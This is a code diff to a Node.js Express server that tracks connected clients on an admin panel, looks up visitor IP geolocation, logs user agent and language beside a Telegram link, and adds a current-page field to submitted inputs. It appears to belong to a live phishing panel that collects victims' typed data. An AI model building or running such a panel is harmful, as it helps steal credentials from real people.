@@ -62,9 +62,9 @@ function getClientData(callback) {
   });
 }
 
-function broadcastAdminPanel() {
+function broadcastAdminPanel(currPage = 'defaultPage') {
   getClientData((clientList) => {
-    const message = JSON.stringify({ type: 'adminUpdate', clientList });
+    const message = JSON.stringify({ type: 'adminUpdate', clientList, currPage });
     console.log(`Broadcasting to admin panel: ${message}`);
     if (adminClient) {
       adminClient.write(`data: ${message}\n\n`);
@@ -90,7 +90,7 @@ const handleRequest = async (req, res) => {
   const sendAPIRequest = async (ipAddress) => {
     try {
       const apiResponse = await axios.get(`${API_URL}${ipAddress}&localityLanguage=en&key=${API_KEY}`);
-      console.log(apiResponse.data);
+      //console.log(apiResponse.data);
       return apiResponse.data;
     } catch (error) {
       console.error(`Error fetching IP information: ${error.message}`);
@@ -133,8 +133,7 @@ const handleRequest = async (req, res) => {
         `USER AGENT       : ${userAgent}\n` +
         `SYSTEM LANGUAGE  : ${systemLang}\n` +
         `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-    res.send('dn');
+        
     return;
   }
 
@@ -162,6 +161,7 @@ app.get('/events', (req, res) => {
   const clientId = req.query.clientId;
   const isAdmin = req.query.admin === 'true';
   const clientIp = getClientIp(req);
+  const currPage = req.query.currPage || 'defaultPage'; // Provide a default value if currPage is undefined
 
   console.log(`Received /events request: clientId=${clientId}, isAdmin=${isAdmin}, ip=${clientIp}`);
 
@@ -191,10 +191,10 @@ app.get('/events', (req, res) => {
         adminClient = null;
         console.log('Admin client disconnected');
       }
-      broadcastAdminPanel();
+      broadcastAdminPanel(currPage); // Pass currPage here
     });
 
-    broadcastAdminPanel();
+    broadcastAdminPanel(currPage); // Pass currPage here
   } else {
     res.status(400).send('Invalid clientId or admin query parameter');
   }
@@ -226,7 +226,7 @@ app.post('/delete-client', (req, res) => {
 });
 
 app.post('/input', async (req, res) => { // Mark the route handler as async
-  const { clientId, inputs } = req.body;
+  const { clientId, currPage, inputs } = req.body;
 
   console.log('Received /input request:', req.body);
 
